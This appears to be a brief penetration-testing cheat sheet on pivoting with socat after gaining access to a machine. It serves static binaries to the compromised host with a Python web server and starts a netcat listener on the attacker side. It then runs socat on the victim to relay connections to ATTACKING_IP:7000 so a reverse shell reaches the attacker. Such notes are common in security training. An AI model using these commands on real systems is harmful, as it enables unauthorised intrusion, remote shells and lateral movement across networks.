#### Useful binaries 
https://github.com/andrew-d/static-binaries

#### Socat 
>If we have gain access to a machine then socat can encrypted create a relay on compromised machine and we can get a reverse shell on another machine and socat forwards to our machine.
>Can be used in both linux and windows systems.
>Can be used to create encrypted port forward and relays.
```
sudo python3 -m http.server 80
Download the binary in compromised host using curl/wget.
```

##### In local machine 
>nc -nvlp 7000

##### In Compromised Machine
>./socat tcp-l:8000 tcp:ATTACKING_IP:7000 &

#### Killing Socat Connections
```
jobs
kill PID
```
